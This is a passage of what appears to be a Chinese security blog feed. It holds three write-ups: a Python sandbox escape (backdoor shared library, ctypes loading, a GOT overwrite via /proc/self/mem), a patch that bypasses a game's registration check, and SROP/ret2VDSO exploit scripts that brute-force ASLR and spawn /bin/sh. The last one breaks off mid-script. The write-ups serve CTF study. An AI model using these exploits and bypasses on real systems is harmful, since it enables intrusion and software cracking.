&#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;]methods = [&#39;os&#39;, &#39;sys&#39;, &#39;__builtin__&#39;]results = {}for module in all_modules:    results[module] = {        &#39;flag&#39;: 0,        &#39;result&#39;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                results[module][&#39;flag&#39;] = 1                results[module][&#39;result&#39;][method] = &#39;\033[1;31mYES\033[0m&#39;            else:                results[module][&#39;result&#39;][method] = &#39;NO&#39;    except Exception as e:        print module, efor result in results:    if results[result][&#39;flag&#39;]:        print &#39;[*]&#39;, result        for r in results[result][&#39;result&#39;]:            print &#39;\t[+]&#39;, r, &#39;=&gt;&#39;, results[result][&#39;result&#39;][r]</code></pre><h1 id="伪-private-属性和函数"><a href="#伪-private-属性和函数" class="headerlink" title="伪 private 属性和函数"></a>伪 <code>private</code> 属性和函数</h1><p>Python 中以双下划线开头的函数和属性是 <code>private</code> 的，但是这种 <code>private</code> 只是形式上的，表示这个函数不应该在本类之外的地方进行访问，而是否遵守则取决于具体的实现。公有的函数和属性，使用其名字直接进行访问；而私有的属性和函数，使用 <code>下划线+类名+函数名</code> 进行访问：</p><pre><code class="python">In [1]: class A():    ...:     __a = 1    ...:     b = 2    ...:     def __c(self):    ...:         pass    ...:     def d(self):    ...:         pass    ...:In [2]: dir(A)Out[2]: [&#39;_A__a&#39;, &#39;_A__c&#39;, &#39;__doc__&#39;, &#39;__module__&#39;, &#39;b&#39;, &#39;d&#39;]</code></pre><h1 id="构造-so-库"><a href="#构造-so-库" class="headerlink" title="构造 so 库"></a>构造 so 库</h1><p>编译一个 so 库，并写入指定的路径：</p><pre><code class="cpp">// gcc bkdoor.c -shared -fPIC -o libbkdoor.sovoid my_init() __attribute__((constructor));void my_init() {    system(&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;);}</code></pre><p>调用 ctypes 来载入 so 库：</p><pre><code class="python">In [1]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[235] =&gt; ctypes.CDLLIn [2]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236] =&gt; ctypes.LibraryLoaderIn [3]: &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236](&#39;&#39;.__class__.__mro__[-1].__subclasses__()[235]).LoadLibrary(&#39;/tmp/libbkdoor.so&#39;)Out[3]: &lt;CDLL &#39;/tmp/libbkdoor.so&#39;, handle 2831310 at 7ff2434184d0&gt;In [4]: __import__(&#39;os&#39;).system(&#39;cat /tmp/ls_home_ctf&#39;)total 8drwxr-xr-x 2 root root 4096 Apr  3 02:23 .drwxr-xr-x 1 root root 4096 Apr  3 02:23 ..-rw-r--r-- 1 root root    0 Apr  3 02:23 flagOut[4]: 0</code></pre><h1 id="修改-GOT-表"><a href="#修改-GOT-表" class="headerlink" title="修改 GOT 表"></a>修改 GOT 表</h1><p>类似 PWN 里的做法，可以把 <code>fopen</code> 的 GOT 改为 <code>system</code>。先用 objdump 查找：</p><pre><code class="bash">/usr/bin ❯ objdump -R python | grep -E &quot;fopen|system&quot;00000000008de2b8 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.500000000008de8c8 R_X86_64_JUMP_SLOT  fopen64@GLIBC_2.2.5</code></pre><p>一句话脚本：</p><pre><code class="python"># 0x00000000008de2b8 =&gt; system# 0x00000000008de8c8 =&gt; fopen(lambda r, w:    r.seek(0x00000000008de2b8) or    w.seek(0x00000000008de8c8) or    w.write(r.read(8)) or    ().__class__.__bases__[0].__subclasses__()[40](&#39;ls&#39;))(    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;r&#39;),    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;w&#39;, 0))</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SameBall.exe v1.02 注册码算法浅析</title>
    <link href="blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    <id>blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/</id>
    <published>2020-03-19T05:44:56.000Z</published>
    <updated>2020-03-20T08:00:50.354Z</updated>
    
    <content type="html"><![CDATA[<p>老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>程序是一个对对碰游戏，每过一段时间，程序会检测注册表中是否有注册信息，如果没有会弹出注册窗口。</p><h1 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h1><p>先看看注册向导中会提供什么有用的信息：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/2.png" srcset="/img/loading.gif" alt></p><p>通过字符串搜索，定位到关键的几处代码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/3.png" srcset="/img/loading.gif" alt></p><p>然后单步走出这个函数，在 004063CA 处，对前面函数的结构做了一个判断，并跳有一个跳转，往下的代码，可以看出是在使用 RegSetValueA 往注册表里写东西，说明判断注册码成功后进行注册。那么只需要把这个跳转 nop 掉，或者是改成强制的 JMP 004063D0（即跳到下一条指令）即可：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/5.png" srcset="/img/loading.gif" alt></p><p>将修改保存到文件之后随便输入什么内容都能注册了。</p><h1 id="Algorithm-Analysis"><a href="#Algorithm-Analysis" class="headerlink" title="Algorithm Analysis"></a>Algorithm Analysis</h1><p>先尝试随机输入一些数据，然后根据前面的分析，可以发现在 004063B2 处进行了判断，前面的函数应该生成了注册码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/6.png" srcset="/img/loading.gif" alt></p><p>进入 00406780 函数，通过函数将两个长为 32 的字符串转为了整型，整型的字长被记录在最低字上：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/7.png" srcset="/img/loading.gif" alt></p><p>接着在在 0040686C 处发现两个字符串以及我们输入的字符串被作为参数传入：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/8.png" srcset="/img/loading.gif" alt></p><p>进入 00406570 函数之后，在 004065C0 处先对字符串的长度判断是否小于 0x100，接着判断字符串的长度是否大于零：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/9.png" srcset="/img/loading.gif" alt></p><p>然后对字符串每个字符进行判断是否在 0 ～ F 的范围内，即是否是一个十六进制字符串：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/10.png" srcset="/img/loading.gif" alt></p><p>显然如果不是的话就会出错，所以在这里设下断点，重新输入一个十六进制数 1234 作为注册码。接着继续往下，在 0040663A 处将我们的输入字符串转成了整型：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/11.png" srcset="/img/loading.gif" alt></p><p>接着往下跟进 00401AE0 函数，其中也传入了三个数字。在 00401B39 到 00401B48 处，计算 8231FC324594496514663D91E6C19989 共有多少位：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/12.png" srcset="/img/loading.gif" alt></p><p>接着将得到的位数 0x80 减去 2，开始进入下面的一个大循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/13.png" srcset="/img/loading.gif" alt></p><p>接着在循环中多次调用了 00410630 函数，其中将我们的输入自己相乘，并将结果返回：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/14.png" srcset="/img/loading.gif" alt></p><p>然后调用了 00410A40 函数，具体的汇编个人觉得是被编译器优化过后的结果，通过推测判断可以发现这个函数的运行结果为之前的乘积模 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/15.png" srcset="/img/loading.gif" alt></p><p>接着在后面取出了 8231FC324594496514663D91E6C19989，去最高的字并右移 0x1E 位，判断最低位是否为 1，如果为 1 进行下面的一堆乘法操作；反之跳过这段内容。看到这段内容，回想起以前做 ACM 的时候接触过的快速幂算法，按比特判断是否加上对应的次方：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/16.png" srcset="/img/loading.gif" alt></p><p>如果为 0，跳转到最下面，将迭代的数字减一，并开始下一个循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/17.png" srcset="/img/loading.gif" alt></p><p>在接下来的循环中，如果判断相乘的数大于一个字，就会分成几个字分别和目标相乘，依次由最高字开始，每次将乘积左移 32 位后加上下一次的乘积：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/18.png" srcset="/img/loading.gif" alt></p><p>这样下来基本清楚 00401AE0 函数是将我们的输入乘上 8231FC324594496514663D91E6C19989 次方再模去 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果，推测应该是 RSA 了。后面有一些乱七八糟的函数，调试了很多遍后没发现有什么作用。最后下断点在 00401E34 这里，最后 EAX 存储的地址即为指向 0x1234 经过上面操作的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/19.png" srcset="/img/loading.gif" alt></p><p>然后在 00406570 函数的最后面 0040675F 这边停下来，发现最后将结果转成了字符串，并在 EAX 里存储了这个字符串的地址：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/20.png" srcset="/img/loading.gif" alt></p><p>最后调试的时候是将结果和 0 进行比较，这样的话注册码写 0 就行了，0 的几次方结果都是 0。测试了一下注册码写 0 的话是可以写入注册表的，但是感觉不太可能这么简单，不过前面的 RSA 算法分析应该是没有什么问题了：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/21.png" srcset="/img/loading.gif" alt></p><p>整体看下来发现动态调试确实相比静态分析能更加深入地熟悉一个程序，连续分析了两天，是一次痛苦但收获颇多的经历。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.pediy.com/thread-38901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-38901.htm</a><br><a href="https://oi-wiki.org/math/quick-pow/" target="_blank" rel="noopener">https://oi-wiki.org/math/quick-pow/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Use SROP with ret2VDSO</title>
    <link href="blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/"/>
    <id>blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/</id>
    <published>2020-03-14T02:24:24.000Z</published>
    <updated>2020-03-19T15:51:15.263Z</updated>
    
    <content type="html"><![CDATA[<p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p><a id="more"></a><h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p><blockquote><p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p></blockquote><p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p><pre><code class="bash">$ ldd /bin/sh    linux-vdso.so.1 =&gt;  (0x00007ffda1746000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)    /lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</code></pre><p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p><h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p><ul><li><code>sysenter</code></li><li><code>sysexit</code></li></ul><p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p><p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xffffffffff600000   0xffffffffff600000:    mov    rax,0x60   0xffffffffff600007:    syscall   0xffffffffff600009:    ret</code></pre><p>可以写一个程序做一个系统调用的测试：</p><pre><code class="cpp">#include &lt;time.h&gt;#include &lt;stdio.h&gt;typedef time_t (*time_func)(time_t *);int main(int argc, char *argv[]) {    time_t tloc;    int retval = 0;    time_func func = (time_func) 0xffffffffff600000;    retval = func(&amp;tloc);    if (retval &lt; 0) {        perror(&quot;time_func&quot;);        return -1;    }    printf(&quot;%ld\n&quot;, tloc);    return 0;}</code></pre><p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p><h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p><pre><code class="asm">push ebp ; mov ebp, esp</code></pre><p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p><h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p><ol><li>暴力破解</li><li>通过泄漏<ul><li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li><li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li><li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul><li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li><li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li></ul></li></ul></li></ol><p>查看存储 VDSO 的地址：</p><pre><code class="gdb">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</code></pre><p>查看 VDSO 的地址（直接 vmmap 也行）：</p><pre><code class="gdb">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso$2 = (const Elf32_Ehdr *) 0xf7fd8000</code></pre><p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p><pre><code class="gdb">assassinq&gt;&gt; info auxv32   AT_SYSINFO           Special system info/entry points 0xf7fd8b5033   AT_SYSINFO_EHDR      System-supplied DSO&#39;s ELF header 0xf7fd8000 &lt;--- Address of VDSO16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff6    AT_PAGESZ            System page size               409617   AT_CLKTCK            Frequency of times()           1003    AT_PHDR              Program headers for program    0x80480344    AT_PHENT             Size of program header entry   325    AT_PHNUM             Number of program headers      97    AT_BASE              Base address of interpreter    0xf7fd90008    AT_FLAGS             Flags                          0x09    AT_ENTRY             Entry point of program         0x804834011   AT_UID               Real user ID                   012   AT_EUID              Effective user ID              013   AT_GID               Real group ID                  014   AT_EGID              Effective group ID             023   AT_SECURE            Boolean, was exec setuid-like? 025   AT_RANDOM            Address of 16 random bytes     0xffffd8cb31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;0    AT_NULL              End of vector                  0x0</code></pre><p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p><pre><code class="bash">$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    ...</code></pre><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[10] = &quot;/bin/sh\x00&quot;;void pwnme() {    char s[0x100];    char *welcome = &quot;&gt; &quot;;    write(1, welcome, 2);    read(0, s, 0x400);}int main() {    pwnme();    return 0;}</code></pre><p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xf7fd8b71   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:    mov    eax,0x77   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:    int    0x80   0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;:    nop</code></pre><p>关闭 ASLR 对 ret2VDSO 进行测试：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]context.arch = &#39;i386&#39;bin_sh_addr = 0x804a020bss_addr = 0x804a030p = process(&#39;./main&#39;)#gdb.attach(p)vdso_addr = 0xf7fd8000print &#39;Try vdso %s&#39; % hex(vdso_addr)payload = &#39;A&#39; * 0x110frame = SigreturnFrame(kernel=&quot;i386&quot;)frame.eax = constants.SYS_execveframe.ebx = bin_sh_addrframe.eip = vdso_addr + 0xb76 # address of int 0x80frame.esp = bss_addrframe.ebp = bss_addrframe.gs = 0x63frame.cs = 0x23frame.es = 0x2bframe.ds = 0x2bframe.ss = 0x2bret_addr = vdso_addr + 0xb71 # address of sigreturnpayload += p32(ret_addr) + str(frame)p.recvuntil(&#39;&gt; &#39;)p.sendline(payload)p.sendline(&#39;echo pwned&#39;)data = p.recvuntil(&#39;pwned&#39;)if data != &#39;pwned&#39;:    raise Exception, &#39;Failed&#39;p.interactive()</code></pre><p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *bin_sh_addr = 0x804a020bss_addr = 0x804a030vdso_range = range(0xf7600000, 0xf7700000, 0x1000)def bruteforce():    global p    context.arch = &#39;i386&#39;    p = process(&#39;./main&#39;)    global vdso_addr    vdso_addr = random.choice(vdso_range)    print &#39;Try vdso %s&#39; % hex(vdso_addr)    payload = &#39;A&#39; * 0x110    frame = SigreturnFrame(kernel=&quot;i386&quot;)    frame.eax = constants.SYS_execve    frame.ebx = bin_sh_addr    frame.eip = vdso_addr + 0xb76 # address of int 0x80    frame.esp = bss_addr    frame.ebp = bss_addr    frame.gs = 0x63    frame.cs = 0x23    frame.es = 0x2b    frame.ds = 0x2b    frame.ss = 0x2b    ret_addr = vdso_addr + 0xb71 # address of sigreturn    payload += p32(ret_addr) + str(frame)    p.recvuntil(&#39;&gt; &#39;)    p.send(payload)    p.sendline(&#39;echo pwned&#39;)    data = p.recvuntil(&#39;pwned&#39;)    if data != &#39;pwned&#39;:        info(&#39;Failed&#39;)    returnif __name__ == &#39;__main__&#39;:    global p, vdso_addr    i = 1    while True:        print &#39;Try %d&#39; % i        try:            bruteforce()        except Exception as e:            info(&#39;Wrong VDSO&#39;)            p.close()            i += 1            continue        info(&#39;vdso_addr = &#39; + hex(vdso_addr))        break    p.interactive()</code></pre><h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p><pre><code class="nasm">section .textglobal _startjmp _startvuln:sub rsp, 8mov rax, 0 ; sys_readxor rdi, rdimov rsi, rspmov rdx, 1024syscalladd rsp, 8ret_start:call vulnmov rax, 60 ; sys_exitxor rdi, rdisyscallgadgets:mov rdi, 1retmov rax, 15retsyscallret</code></pre><p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./main&#39;)# id&#39;s of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0bAT_EUID = 0x0cAT_GID = 0x0dAT_EGID = 0x0eAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1fAT_PLATFORM = 0x0fgdb.attach(p)vuln_addr = 0x400082set_write = 0x4000acsyscall_addr = 0x400096set_sigreturn = 0x4000b2payload = &#39;/bin/sh\x00&#39;payload += p64(vuln_addr)payload += p64(set_write)payload += p64(syscall_addr)payload += &#39;A&#39; * 8payload += p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)payload = &#39;A&#39;raw_input(&#39;@&#39;)p.send(payload)ENV_AUX_VEC = p.recv(1024)QWORD_LIST = []for i in range(0, len(ENV_AUX_VEC), 8):    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址info(hex(start_aux_vec))AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary tableAUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]info(&quot;vdso_addr = &quot; + hex(vdso_addr))bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址info(&quot;bin_sh_addr = &quot; + hex(bin_sh_addr))syscall_ret = 0xffffffffff600007syscall_ret = 0x4000b8frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_addrpayload = &#39;A&#39; * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p><pre><code class="bash">$ checksec ./fuckup[*] &#39;/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p><pre><code class="bash">$ ./fuckupWelcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.This app is to help prove the benefits of F.U.C.K.U.P.Main Menu---------1. Display info2. Change random3. View state info4. Test stack smash-------0. Quit</code></pre><p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p><pre><code class="cpp">int sub_80481A6(){  ...  do  {    seed_1 = WELL512() * 4294967295.0;    seed_2 = (signed __int64)seed_1;    addy = (void *)(seed_2 &amp; 0xFFFFF000);    actual = my_mmap(seed_2 &amp; 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0);  }  while ( (seed_2 &amp; 0xFFFFF000) != actual );  qmemcpy(addy, dword_804EB40, 0x7000u);  my_mprotect(addy, 0x4000u, 5);  ...}</code></pre><p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p><ul><li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li><li>直接溢出改返回地址，但只有 100 个字节<ul><li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li><li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li><li>使用 sysenter 将栈转移到 TLS 段</li><li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li></ul></li><li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li><li>循环直到成功 get shell</li></ul><p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from z3 import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;state = [BitVec(&quot;a1_{0}&quot;.format(i), 32) for i in range(16)]def m(x):    return p32(x + offset)def well512(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ ((a &lt;&lt; 16) &amp; 0xffffffff) ^ ((c &lt;&lt; 15) &amp; 0xffffffff)    c = state[(index+9) &amp; 15]    c ^= (c &gt;&gt; 11)    state[(index+10) &amp; 15] = c ^ b    a = state[idx]    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; 2) &amp; 0xffffffff) ^ (        (b &lt;&lt; 18) &amp; 0xffffffff) ^ ((c &lt;&lt; 28) &amp; 0xffffffff)    return idxdef well512_z3(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ (a &lt;&lt; 16) ^ (c &lt;&lt; 15)    c = state[(index+9) &amp; 15]    c ^= LShR(c, 11)    a = state[idx]    state[(index+10) &amp; 15] = b ^ c    d = ((32 * (c ^ b)) 